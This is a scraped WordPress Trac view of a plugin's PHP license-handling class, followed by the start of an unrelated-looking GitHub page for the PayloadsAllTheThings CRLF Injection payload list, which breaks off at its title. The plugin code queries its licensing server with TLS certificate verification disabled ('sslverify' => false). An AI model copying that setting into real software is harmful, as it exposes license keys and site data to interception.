| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from github.com_ba26f9fb_20250111_113427.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FCRLF%2520Injection%2FREADME.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Fblob%2Fmaster%2FCRLF%2520Injection%2FREADME.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=swisskyrepo%2FPayloadsAllTheThings)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[swisskyrepo](/swisskyrepo)
/
**[PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings)**
Public

* [Notifications](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings) You must be signed in to change notification settings
* [Fork
  14.9k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)
* [Star
   62.4k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests
  4](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects
  0](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

Additional navigation options

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

## Files

 master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[CRLF Injection](/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
/
# README.md

Copy path Blame  Blame
## Latest commit

## History

[History](/swisskyrepo/PayloadsAllTheThings/commits/master/CRLF%20Injection/README.md)159 lines (106 loc) · 5.45 KB master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[CRLF Injection](/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
/
# README.md

Top
## File metadata and controls

* Preview
* Code
* Blame

159 lines (106 loc) · 5.45 KB[Raw](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/refs/heads/master/CRLF%20Injection/README.md)
# Carriage Return Line Feed

